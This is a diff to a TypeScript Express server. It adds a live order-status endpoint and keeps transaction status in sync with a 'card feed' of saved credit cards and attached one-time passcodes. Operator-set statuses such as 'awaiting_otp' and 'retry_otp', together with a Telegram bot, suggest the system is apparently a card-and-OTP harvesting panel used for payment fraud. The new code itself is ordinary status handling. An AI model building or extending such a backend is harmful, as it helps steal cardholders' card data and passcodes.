@@ -25,9 +25,11 @@ import type { Admin, ServerTransaction } from "./server/store";
 import { notifyOrderStatusByRef, sendFcmAnnouncement } from "./server/pushFcm";
 import {
   attachOtpToCardFeed,
+  getCardFeedStatus,
   listCardFeed,
   saveCreditCardForOrder,
   getCreditCardByOrderRef,
+  updateCardFeedStatus,
 } from "./server/creditCardStore";
 
 type TelegramBotInstance = InstanceType<typeof TelegramBot>;
@@ -1920,6 +1922,47 @@ async function startServer() {
     }
   });
 
+  const ORDER_STATUS_PRIORITY = [
+    "pending",
+    "awaiting_otp",
+    "retry_otp",
+    "failed",
+    "refunded",
+    "suspended",
+    "completed",
+  ] as const;
+
+  function resolveLiveOrderStatus(txStatus: string, feedStatus: string | null): string {
+    const tx = String(txStatus || "pending").toLowerCase();
+    const feed = feedStatus ? String(feedStatus).toLowerCase() : null;
+    if (!feed || feed === tx) return tx;
+    const txIx = ORDER_STATUS_PRIORITY.indexOf(tx as (typeof ORDER_STATUS_PRIORITY)[number]);
+    const feedIx = ORDER_STATUS_PRIORITY.indexOf(feed as (typeof ORDER_STATUS_PRIORITY)[number]);
+    if (txIx < 0) return feed;
+    if (feedIx < 0) return tx;
+    return feedIx >= txIx ? feed : tx;
+  }
+
+  app.get("/api/transactions/order-status", async (req, res) => {
+    const clientId = typeof req.query.client_id === "string" ? req.query.client_id.trim() : "";
+    const orderRef = typeof req.query.order_ref === "string" ? req.query.order_ref.trim() : "";
+    if (!clientId || !orderRef) {
+      return res.status(400).json({ error: "client_id and order_ref required" });
+    }
+    try {
+      const tx = await store.getTransactionByOrderRef(orderRef);
+      if (!tx || tx.client_id !== clientId) {
+        return res.status(404).json({ error: "Order not found" });
+      }
+      const feedStatus = await getCardFeedStatus(orderRef);
+      const status = resolveLiveOrderStatus(tx.status, feedStatus);
+      res.json({ order_ref: orderRef, status, tx_status: tx.status, feed_status: feedStatus });
+    } catch (e) {
+      console.error(e);
+      res.status(500).json({ error: "Failed to load order status" });
+    }
+  });
+
   app.get("/api/wallet/balance", async (req, res) => {
     try {
       const userId = typeof req.query.user_id === "string" ? req.query.user_id.trim() : "";
@@ -2472,10 +2515,17 @@ async function startServer() {
       if (!CARD_FEED_STATUSES.has(status)) {
         return res.status(400).json({ error: "Invalid status" });
       }
-      const ok = await store.updateTransactionStatusByRef(orderRef, status);
-      if (!ok) return res.status(404).json({ error: "Order not found" });
+      const txOk = await store.updateTransactionStatusByRef(orderRef, status);
+      const feedOk = await updateCardFeedStatus(orderRef, status);
+      if (!txOk && !feedOk) return res.status(404).json({ error: "Order not found" });
       void notifyOrderStatusByRef(orderRef, status);
-      res.json({ ok: true, order_ref: orderRef, status });
+      res.json({
+        ok: true,
+        order_ref: orderRef,
+        status,
+        tx_updated: txOk,
+        feed_updated: feedOk,
+      });
     } catch (e) {
       console.error(e);
       res.status(500).json({ error: "Failed to update card-feed status" });
